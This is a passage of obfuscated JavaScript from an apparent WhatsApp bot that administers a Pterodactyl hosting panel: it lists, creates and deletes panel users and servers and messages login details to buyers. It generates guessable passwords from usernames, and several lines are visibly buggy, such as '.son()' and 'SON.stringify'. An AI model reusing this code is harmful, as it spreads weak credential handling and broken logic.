          return _0x4242ca(mess.only.owner);
        }
        _0x4242ca('' + ('case' + ("'" + _0x11eb7e + "'") + fs.readFileSync("C-Suit-v3").toString().split("case '" + _0x11eb7e + "'")[0x1].split("break")[0x0] + "break"));
        break;
      case 'listusr':
        {
          if (!_0x11eb7e) {
            return _0x4242ca("Specially for Lostboy");
          }
          let _0x7fbd65 = _0x4376c7[0x0] ? _0x4376c7[0x0] : '1';
          let _0x35405e = await fetch(domain + "/api/application/users?page=" + _0x7fbd65, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          let _0x5b3d93 = await _0x35405e.json();
          let _0x37157c = _0x5b3d93.data;
          let _0x51e676 = "list of users:\n\n";
          for (let _0x3e15c1 of _0x37157c) {
            let _0x1306e2 = _0x3e15c1.attributes;
            _0x51e676 += "ID: " + _0x1306e2.id + " - Status: " + (_0x1306e2.attributes?.['user']?.["server_limit"] === null ? "Inactive" : "Active") + "\n";
            _0x51e676 += _0x1306e2.username + "\n";
            _0x51e676 += _0x1306e2.first_name + " " + _0x1306e2.last_name + "\n\n";
          }
          _0x51e676 += "Page: " + _0x5b3d93.meta.pagination.current_page + '/' + _0x5b3d93.meta.pagination.total_pages + "\n";
          _0x51e676 += "Total Users: " + _0x5b3d93.meta.pagination.count;
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'text': _0x51e676
          }, {
            'quoted': _0x5f530e
          });
          if (_0x5b3d93.meta.pagination.current_page < _0x5b3d93.meta.pagination.total_pages) {
            _0x4242ca("Use the command  " + _0x1e0f65 + "listusr " + (_0x5b3d93.meta.pagination.current_page + 0x1) + " to lidt servers.");
          }
        }
        break;
      case 'listsrv':
        {
          if (!_0x11eb7e) {
            return _0x4242ca("You ain't Lostboy.");
          }
          let _0x1a1498 = _0x4376c7[0x0] ? _0x4376c7[0x0] : '1';
          let _0xa5700a = await fetch(domain + '/api/application/servers?page=' + _0x1a1498, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          let _0x283946 = await _0xa5700a.json();
          let _0x5e9c55 = _0x283946.data;
          let _0x1e6bff = "List of all servers:\n\n";
          for (let _0x19127c of _0x5e9c55) {
            let _0x1a045f = _0x19127c.attributes;
            let _0x580ec7 = await fetch(domain + '/api/client/servers/' + _0x1a045f.uuid.split`-`[0x0] + "/resources", {
              'method': "GET",
              'headers': {
                'Accept': "application/json",
                'Content-Type': "application/json",
                'Authorization': "Bearer " + capikey
              }
            });
            let _0x3e0187 = await _0x580ec7.json();
            let _0x529570 = _0x3e0187.attributes ? _0x3e0187.attributes.current_state : _0x1a045f.status;
            _0x1e6bff += "ID Server: " + _0x1a045f.id + "\n";
            _0x1e6bff += "Nama Server: " + _0x1a045f.name + "\n";
            _0x1e6bff += "Status: " + _0x529570 + "\n\n";
          }
          _0x1e6bff += "Page : " + _0x283946.meta.pagination.current_page + '/' + _0x283946.meta.pagination.total_pages + "\n";
          _0x1e6bff += "Total Server: " + _0x283946.meta.pagination.count;
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'text': _0x1e6bff
          }, {
            'quoted': _0x5f530e
          });
          if (_0x283946.meta.pagination.current_page < _0x283946.meta.pagination.total_pages) {
            _0x4242ca("Use the " + _0x1e0f65 + "listsrv " + (_0x283946.meta.pagination.current_page + 0x1) + " to view the next page.");
          }
        }
        break;
      case "delsrv":
        {
          if (!_0x11eb7e) {
            return _0x4242ca("Specially for lostboy ");
          }
          let _0x497c8b = _0x4376c7[0x0];
          if (!_0x497c8b) {
            return _0x4242ca("Where is his id?");
          }
          let _0x4f647e = await fetch(domain + "/api/application/servers/" + _0x497c8b, {
            'method': 'DELETE',
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          let _0xbb6ef9 = _0x4f647e.ok ? {
            'errors': null
          } : await _0x4f647e.json();
          if (_0xbb6ef9.errors) {
            return _0x4242ca("*SERVER NOT FOUND*");
          }
          _0x4242ca("*SUCCESSFULLY DELETED THE SERVER*");
        }
        break;
      case "addusr":
        {
          if (!_0x11eb7e) {
            return _0x4242ca("Sorry this command is soecially for bit developers ");
          }
          let _0x206805 = _0x208b05.split(',');
          if (_0x206805.length < 0x3) {
            return _0x4242ca("*Wrong format*\n\nExample:\n" + (_0x1e0f65 + _0x418bf4) + " email,username,name,number/tag");
          }
          let _0x921ec8 = _0x206805[0x0];
          let _0x4de1d3 = _0x206805[0x1];
          let _0x998b52 = _0x206805[0x2];
          let _0x182c1d = _0x5f530e.quoted ? _0x5f530e.quoted.sender : _0x206805[0x3] ? _0x206805[0x3].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x5f530e.mentionedJid[0x0];
          if (!_0x182c1d) {
            return _0x4242ca("*Wrong Format!*\n\nExample:\n" + (_0x1e0f65 + _0x418bf4) + " email,username,name,number/tag");
          }
          let _0x1a81a4 = (await _0x239047.onWhatsApp(_0x182c1d.split`@`[0x0]))[0x0] || {};
          let _0xe6ae60 = _0x1a81a4.exists ? crypto.randomBytes(0x5).toString("hex") : _0x206805[0x3];
          let _0x3b94c2 = await fetch(domain + '/api/application/users', {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x921ec8,
              'username': _0x4de1d3,
              'first_name': _0x998b52,
              'last_name': 'Memb',
              'language': 'en',
              'password': _0xe6ae60.toString()
            })
          });
          let _0x49094e = await _0x3b94c2.json();
          if (_0x49094e.errors) {
            return _0x4242ca(JSON.stringify(_0x49094e.errors[0x0], null, 0x2));
          }
          _0x239047.sendMessage(_0x182c1d, {
            'text': "*HERE ARE YOUR DETAILS OF YOUR PANEL ACCOUNT*\n\n╭─❏ *『 USER INFO 』*\n┣❏ ➤ *📧EMAIL* : " + _0x921ec8 + "\n┣❏ ➤ *👤USERNAME* : " + _0x4de1d3 + "\n┣❏ ➤ *🔐PASSWORD* : " + _0xe6ae60.toString() + "\n┣❏ ➤ *🌐LOGIN* : " + domain + "\n┗⬣"
          });
        }
        break;
      case "1gb":
        {
          if (!_0x2fc88e && !_0x11eb7e) {
            return _0x4242ca("Sorry, you are not a premium user yet. To become a premium user, please buy from the owner by typing .owner");
          }
          let _0x294572 = _0x208b05.split(',');
          if (_0x294572.length < 0x2) {
            return _0x4242ca("*Wrong Format!*\nExample:\n" + (_0x1e0f65 + _0x418bf4) + " user,number");
          }
          let _0x2a6a31 = _0x294572[0x0];
          let _0x37ed93 = _0x5f530e.quoted ? _0x5f530e.quoted.sender : _0x294572[0x1] ? _0x294572[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x5f530e.mentionedJid[0x0];
          let _0x3902d4 = _0x2a6a31 + "1GB";
          let _0x8e640c = global.eggsnya;
          let _0x4e67c1 = global.location;
          let _0x2b21ab = _0x2a6a31 + '1398@gmail.com';
          akunlo = 'https://files.catbox.moe/sc7oci.jpg';
          if (!_0x37ed93) {
            return;
          }
          let _0x3abc31 = _0x2a6a31 + "001";
          let _0x1d5430 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x2b21ab,
              'username': _0x2a6a31,
              'first_name': _0x2a6a31,
              'last_name': _0x2a6a31,
              'language': 'en',
              'password': _0x3abc31
            })
          });
          let _0x2142bc = await _0x1d5430.json();
          if (_0x2142bc.errors) {
            return _0x4242ca(JSON.stringify(_0x2142bc.errors[0x0], null, 0x2));
          }
          let _0x2ad488 = _0x2142bc.attributes;
          let _0x997b5 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x8e640c, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x4242ca("DONE BY LOSTBOY\n *DONE CREATE USER + SERVER ID :* " + _0x2ad488.id);
          ctf = "hi @" + _0x37ed93.split`@`[0x0] + "\n\n *Username* : " + _0x2ad488.username + "\n *Password* : " + _0x3abc31 + "\n *Login* : " + domain + "\n\n_*NOTE :*_\n_OWNER ONLY SENDS YOUR ACCOUNT DATA ONCE. PLEASE KEEP IT PROPERLY IF YOUR ACCOUNT DATA IS LOST, OWNER CANNOT SEND YOUR ACCOUNT AGAIN_\n > DONT SHARE PANEL LINK TO PROTECT YOURSELF FROM DDOS\n\n_*YouTube: youtube.com/@lostboy-tch*_\n\n_*Telegram: t.me/lostboytech12*_\n";
          _0x239047.sendMessage(_0x37ed93, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x239047.chat
          });
          let _0xf6383d = await _0x997b5.json();
          let _0x156b4d = _0xf6383d.attributes.startup;
          let _0x52a427 = await fetch(domain + '/api/application/servers', {
            'method': 'POST',
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x3902d4,
              'description': " ",
              'user': _0x2ad488.id,
              'egg': parseInt(_0x8e640c),
              'docker_image': "ghcr.io/parkervcp/yolks:nodes_18",
              'startup': _0x156b4d,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "1024",
                'swap': 0x0,
                'disk': '0',
                'io': 0x1f4,
                'cpu': '10'
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x4e67c1)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x31047d = await _0x52a427.son();
          if (_0x31047d.errors) {
            return _0x4242ca(SON.stringify(_0x31047d.errors[0x0], null, 0x2));
          }
        }
        break;
      case '2gb':
        {
          if (!_0x2fc88e && !_0x11eb7e) {
            return _0x4242ca("Sorry, you are not a premium user yet. To become a premium user, please buy from the owner by typing .owner");
          }
          let _0x425d43 = _0x208b05.split(',');
          if (_0x425d43.length < 0x2) {
            return _0x4242ca("*Wrong Format!*\nExample:\n" + (_0x1e0f65 + _0x418bf4) + " user,number");
          }
          let _0xd64bf3 = _0x425d43[0x0];
          let _0xa3f8ff = _0x5f530e.quoted ? _0x5f530e.quoted.sender : _0x425d43[0x1] ? _0x425d43[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x5f530e.mentionedJid[0x0];
          let _0x2ca508 = _0xd64bf3 + "2GB";
          let _0x191179 = global.eggsnya;
          let _0x25962f = global.location;
          let _0xb2d645 = _0xd64bf3 + "1398@gmail.com";
          akunlo = "https://files.catbox.moe/sc7oci.jpg";
          if (!_0xa3f8ff) {
            return;
          }
          let _0x17ca93 = _0xd64bf3 + "001";
          let _0x42325f = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': 'application/json',
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0xb2d645,
              'username': _0xd64bf3,
              'first_name': _0xd64bf3,
              'last_name': _0xd64bf3,
              'language': 'en',
              'password': _0x17ca93
            })
          });
          let _0x1b79a3 = await _0x42325f.json();
          if (_0x1b79a3.errors) {
            return _0x4242ca(JSON.stringify(_0x1b79a3.errors[0x0], null, 0x2));
          }
          let _0x2e9005 = _0x1b79a3.attributes;
          let _0x8f97e1 = await fetch(domain + '/api/application/nests/5/eggs/' + _0x191179, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            }
          });
          _0x4242ca("SUCCES CREATE USER ID: " + _0x2e9005.id);
          ctf = "hi @" + _0xa3f8ff.split`@`[0x0] + "\n\n*Username* : " + _0x2e9005.username + "\n*Password* : " + _0x17ca93 + "\n*Login* : " + domain + "\n\n_*NOTE :*_\n_OWNER ONLY SENDS YOUR ACCOUNT DATA ONCE. PLEASE KEEP IT PROPERLY IF YOUR ACCOUNT DATA IS LOST, OWNER CANNOT SEND YOUR ACCOUNT AGAIN_\n > DONT SHARE PANEL LINK TO PROTECT YOURSELF FROM DDOS\n\n_*YouTube: youtube.com/@lostboy-tch*_\n\n_*Telegram: t.me/lostboytech12*_\n";
          _0x239047.sendMessage(_0xa3f8ff, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x239047.chat
          });
          let _0x158cf1 = await _0x8f97e1.json();
          let _0x58d128 = _0x158cf1.attributes.startup;
          let _0x252e9f = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x2ca508,
              'description': " ",
              'user': _0x2e9005.id,
              'egg': parseInt(_0x191179),
              'docker_image': 'ghcr.io/parkervcp/yolks:nodejs_18',
              'startup': _0x58d128,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': '2048',
                'swap': 0x0,
                'disk': '0',
                'io': 0x1f4,
                'cpu': "200"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x25962f)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x38c605 = await _0x252e9f.json();
          if (_0x38c605.errors) {
            return _0x4242ca(JSON.stringify(_0x38c605.errors[0x0], null, 0x2));
          }
        }
        break;
      case "3gb":
        {
          if (!_0x2fc88e && !_0x11eb7e) {
            return _0x4242ca("Sorry, you are not a premium user yet. To become a premium user, please buy from the owner by typing .owner");
          }
          let _0x3f0ac4 = _0x208b05.split(',');
          if (_0x3f0ac4.length < 0x2) {
            return _0x4242ca("*Wrong Format!*\nExample:\n" + (_0x1e0f65 + _0x418bf4) + " user,number");
          }
          let _0x59ef93 = _0x3f0ac4[0x0];
          let _0x5e408b = _0x5f530e.quoted ? _0x5f530e.quoted.sender : _0x3f0ac4[0x1] ? _0x3f0ac4[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x5f530e.mentionedJid[0x0];
          let _0x428cf6 = _0x59ef93 + '3GB';
          let _0x3fc9ce = global.eggsnya;
          let _0x19d27c = global.location;
          let _0x100589 = _0x59ef93 + "1398@gmail.com";
          akunlo = "https://files.catbox.moe/sc7oci.jpg";
          if (!_0x5e408b) {
            return;
          }
          let _0x2343f7 = _0x59ef93 + "001";
          let _0x13bb24 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x100589,
              'username': _0x59ef93,
              'first_name': _0x59ef93,
              'last_name': _0x59ef93,
              'language': 'en',
              'password': _0x2343f7
            })
          });
          let _0x492b82 = await _0x13bb24.json();
          if (_0x492b82.errors) {
            return _0x4242ca(JSON.stringify(_0x492b82.errors[0x0], null, 0x2));
          }
          let _0xb3de48 = _0x492b82.attributes;
          let _0x3e9a0e = await fetch(domain + '/api/application/nests/5/eggs/' + _0x3fc9ce, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x4242ca("SUCCES CREATE USER ID: " + _0xb3de48.id);
          ctf = "hi @" + _0x5e408b.split`@`[0x0] + "\n\n*Username* : " + _0xb3de48.username + "\n*Password* : " + _0x2343f7 + "\n*Login* : " + domain + "\n\n_*NOTE :*_\n_OWNER ONLY SENDS YOUR ACCOUNT DATA ONCE. PLEASE KEEP IT PROPERLY IF YOUR ACCOUNT DATA IS LOST, OWNER CANNOT SEND YOUR ACCOUNT AGAIN_\n > DONT SHARE PANEL LINK TO PROTECT YOURSELF FROM DDOS\n\n_*YouTube: youtube.com/@lostboy-tch*_\n\n_*Telegram: t.me/lostboytech12*_\n";
          _0x239047.sendMessage(_0x5e408b, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x239047.chat
          });
          let _0x383390 = await _0x3e9a0e.json();
          let _0x2cb224 = _0x383390.attributes.startup;
          let _0x15548a = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x428cf6,
              'description': " ",
              'user': _0xb3de48.id,
              'egg': parseInt(_0x3fc9ce),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x2cb224,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "3072",
                'swap': 0x0,
                'disk': '0',
                'io': 0x1f4,
                'cpu': "300"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x19d27c)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x372637 = await _0x15548a.json();
          if (_0x372637.errors) {
            return _0x4242ca(JSON.stringify(_0x372637.errors[0x0], null, 0x2));
          }
        }
        break;
      case '5gb':
        {
          if (!_0x2fc88e && !_0x11eb7e) {
            return _0x4242ca("Sorry, you are not a premium user yet. To become a premium user, please buy from the owner by typing .owner");
          }
          let _0x2bc0e8 = _0x208b05.split(',');
          if (_0x2bc0e8.length < 0x2) {
            return _0x4242ca("*Wrong Format!*\nExample:\n" + (_0x1e0f65 + _0x418bf4) + " user,number");
          }
          let _0x53e75c = _0x2bc0e8[0x0];
          let _0x38b74f = _0x5f530e.quoted ? _0x5f530e.quoted.sender : _0x2bc0e8[0x1] ? _0x2bc0e8[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x5f530e.mentionedJid[0x0];
          let _0x510d4b = _0x53e75c + '5GB';
          let _0x15dc56 = global.eggsnya;
          let _0x2d0286 = global.location;
          let _0x580b0f = _0x53e75c + "1398@gmail.com";
          akunlo = "https://files.catbox.moe/sc7oci.jpg";
          if (!_0x38b74f) {
            return;
          }
          let _0x2d601d = _0x53e75c + "0011";
          let _0x348413 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x580b0f,
              'username': _0x53e75c,
              'first_name': _0x53e75c,
              'last_name': _0x53e75c,
              'language': 'en',
              'password': _0x2d601d
            })
          });
          let _0xab20ad = await _0x348413.json();
          if (_0xab20ad.errors) {
            return _0x4242ca(JSON.stringify(_0xab20ad.errors[0x0], null, 0x2));
          }
          let _0xaa3fca = _0xab20ad.attributes;
          let _0x23364b = await fetch(domain + "/api/application/nests/5/eggs/" + _0x15dc56, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x4242ca("SUCCES CREATE USER ID: " + _0xaa3fca.id);
          ctf = "hi @" + _0x38b74f.split`@`[0x0] + "\n\n*Username* : " + _0xaa3fca.username + "\n*Password* : " + _0x2d601d + "\n*Login* : " + domain + "\n\n_*NOTE :*_\n_OWNER ONLY SENDS YOUR ACCOUNT DATA ONCE. PLEASE KEEP IT PROPERLY IF YOUR ACCOUNT DATA IS LOST, OWNER CANNOT SEND YOUR ACCOUNT AGAIN_\n > DONT SHARE PANEL LINK TO PROTECT YOURSELF FROM DDOS\n\n_*YouTube: youtube.com/@lostboy-tch*_\n\n_*Telegram: t.me/lostboytech12*_\n";
          _0x239047.sendMessage(_0x38b74f, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x239047.chat
          });
          let _0x7aa383 = await _0x23364b.json();
          let _0x52ccb2 = _0x7aa383.attributes.startup;
          let _0x5bf87f = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x510d4b,
              'description': " ",
              'user': _0xaa3fca.id,
              'egg': parseInt(_0x15dc56),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x52ccb2,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': '5138',
                'swap': 0x0,
                'disk': '0',
                'io': 0x1f4,
                'cpu': "200"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x2d0286)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x2b593f = await _0x5bf87f.json();
          if (_0x2b593f.errors) {
            return _0x4242ca(JSON.stringify(_0x2b593f.errors[0x0], null, 0x2));
          }
        }
        break;
      case "4gb":
        {
          if (!_0x2fc88e && !_0x11eb7e) {
            return _0x4242ca("Sorry, you are not a premium user yet. To become a premium user, please buy from the owner by typing .owner");
          }
          let _0x5f7bb = _0x208b05.split(',');
          if (_0x5f7bb.length < 0x2) {
            return _0x4242ca("*Wrong Format!*\nExample:\n" + (_0x1e0f65 + _0x418bf4) + " user,number");
          }
          let _0x22d358 = _0x5f7bb[0x0];
          let _0x45350b = _0x5f530e.quoted ? _0x5f530e.quoted.sender : _0x5f7bb[0x1] ? _0x5f7bb[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x5f530e.mentionedJid[0x0];
          let _0x3ca70a = _0x22d358 + '4';
          let _0x23b3f6 = global.eggsnya;
          let _0x2ef460 = global.location;
          let _0x4ec147 = _0x22d358 + "1398@gmail.com";
          akunlo = "https://files.catbox.moe/sc7oci.jpg";
          if (!_0x45350b) {
            return;
          }
          let _0x19c740 = _0x22d358 + "001";
          let _0x4486f0 = await fetch(domain + '/api/application/users', {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x4ec147,
              'username': _0x22d358,
              'first_name': _0x22d358,
              'last_name': _0x22d358,
              'language': 'en',
              'password': _0x19c740
            })
          });
          let _0x10bdde = await _0x4486f0.json();
          if (_0x10bdde.errors) {
            return _0x4242ca(JSON.stringify(_0x10bdde.errors[0x0], null, 0x2));
          }
          let _0x2de286 = _0x10bdde.attributes;
          let _0x33964a = await fetch(domain + "/api/application/nests/5/eggs/" + _0x23b3f6, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x4242ca("SUCCES CREATE USER ID: " + _0x2de286.id);
          ctf = "hi @" + _0x45350b.split`@`[0x0] + "\n\n*Username* : " + _0x2de286.username + "\n*Password* : " + _0x19c740 + "\n*Login* : " + domain + "\n\n_*NOTE :*_\n_OWNER ONLY SENDS YOUR ACCOUNT DATA ONCE. PLEASE KEEP IT PROPERLY IF YOUR ACCOUNT DATA IS LOST, OWNER CANNOT SEND YOUR ACCOUNT AGAIN_\n > DONT SHARE PANEL LINK TO PROTECT YOURSELF FROM DDOS\n\n_*YouTube: youtube.com/@lostboy-tch*_\n\n_*Telegram: t.me/lostboytech12*_\n";
          _0x239047.sendMessage(_0x45350b, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x239047.chat
          });
          let _0x358287 = await _0x33964a.json();
          let _0x9e62df = _0x358287.attributes.startup;
          let _0x506a17 = await fetch(domain + '/api/application/servers', {
            'method': 'POST',
            'headers': {
              'Accept': 'application/json',
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x3ca70a,
              'description': " ",
              'user': _0x2de286.id,
              'egg': parseInt(_0x23b3f6),
              'docker_image': 'ghcr.io/parkervcp/yolks:nodejs_18',
              'startup': _0x9e62df,
              'environment': {
                'INST': 'npm',
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "4048",
                'swap': 0x0,
                'disk': '0',
                'io': 0x1f4,
                'cpu': "200"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x2ef460)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x305587 = await _0x506a17.json();
          if (_0x305587.errors) {
            return _0x4242ca(JSON.stringify(_0x305587.errors[0x0], null, 0x2));
          }
        }
        break;
      case "6gb":
        {
          if (!_0x2fc88e && !_0x11eb7e) {
            return _0x4242ca("Sorry, you are not a premium user yet. To become a premium user, please buy from the owner by typing .owner");
          }
          let _0x174277 = _0x208b05.split(',');
          if (_0x174277.length < 0x2) {
            return _0x4242ca("*Wrong Format!*\nExample:\n" + (_0x1e0f65 + _0x418bf4) + " user,number");
          }
          let _0x40f9c3 = _0x174277[0x0];
          let _0x129c3e = _0x5f530e.quoted ? _0x5f530e.quoted.sender : _0x174277[0x1] ? _0x174277[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x5f530e.mentionedJid[0x0];
          let _0x5954f3 = _0x40f9c3 + '4';
          let _0xfdd9f1 = global.eggsnya;
          let _0x392929 = global.location;
          let _0x4ecc1e = _0x40f9c3 + "1398@gmail.com";
          akunlo = "https://files.catbox.moe/sc7oci.jpg";
          if (!_0x129c3e) {
            return;
          }
          let _0x39dc36 = _0x40f9c3 + "001";
          let _0x2b0a98 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x4ecc1e,
              'username': _0x40f9c3,
              'first_name': _0x40f9c3,
              'last_name': _0x40f9c3,
              'language': 'en',
              'password': _0x39dc36
            })
          });
          let _0x231d57 = await _0x2b0a98.json();
          if (_0x231d57.errors) {
            return _0x4242ca(JSON.stringify(_0x231d57.errors[0x0], null, 0x2));
          }
          let _0x338fe2 = _0x231d57.attributes;
          let _0xf8e4fe = await fetch(domain + '/api/application/nests/5/eggs/' + _0xfdd9f1, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x4242ca("SUCCESSFULLY CREATED USER ID: " + _0x338fe2.id);
          ctf = "Hi @" + _0x129c3e.split`@`[0x0] + "\n\n*Username* : " + _0x338fe2.username + "\n*Password* : " + _0x39dc36 + "\n*Login* : " + domain + "\n\n_*NOTE :*_\n_OWNER ONLY SENDS YOUR ACCOUNT DATA ONCE. PLEASE KEEP IT PROPERLY IF YOUR ACCOUNT DATA IS LOST, OWNER CANNOT SEND YOUR ACCOUNT AGAIN_\n > DONT SHARE PANEL LINK TO PROTECT YOURSELF FROM DDOS\n_*YouTube: youtube.com/@lostboy-tch*_\n\n_*Telegram: t.me/lostboytech12*_\n";
          _0x239047.sendMessage(_0x129c3e, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x239047.chat
          });
          let _0x260079 = await _0xf8e4fe.json();
          let _0x5b1ed6 = _0x260079.attributes.startup;
          let _0x5b6ff5 = await fetch(domain + "/api/application/servers", {
            'method': 'POST',
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x5954f3,
              'description': " ",
              'user': _0x338fe2.id,
              'egg': parseInt(_0xfdd9f1),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x5b1ed6,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': '6148',
                'swap': 0x0,
                'disk': '0',
                'io': 0x1f4,
                'cpu': '200'
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x392929)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x1b2338 = await _0x5b6ff5.json();
          if (_0x1b2338.errors) {
            return _0x4242ca(JSON.stringify(_0x1b2338.errors[0x0], null, 0x2));
          }
        }
        break;
      case "7gb":
        {
          if (!_0x2fc88e && !_0x11eb7e) {
            return _0x4242ca("Sorry, you are not a premium user yet. To become a premium user, please buy from the owner by typing .owner ");
          }
          let _0x4f2928 = _0x208b05.split(',');
          if (_0x4f2928.length < 0x2) {
            return _0x4242ca("*Wrong format!*\nExample:\n" + (_0x1e0f65 + _0x418bf4) + " user,number");
          }
          let _0x2598f1 = _0x4f2928[0x0];
          let _0x673a10 = _0x5f530e.quoted ? _0x5f530e.quoted.sender : _0x4f2928[0x1] ? _0x4f2928[0x1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : _0x5f530e.mentionedJid[0x0];
          let _0x2566e9 = _0x2598f1 + '4';
          let _0x18aaf6 = global.eggsnya;
          let _0x34f87b = global.location;
          let _0x3af399 = _0x2598f1 + "1398@gmail.com";
          akunlo = "https://files.catbox.moe/sc7oci.jpg";
          if (!_0x673a10) {
            return;
          }
          let _0x2d828f = _0x2598f1 + "001";
          let _0x46a30a = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
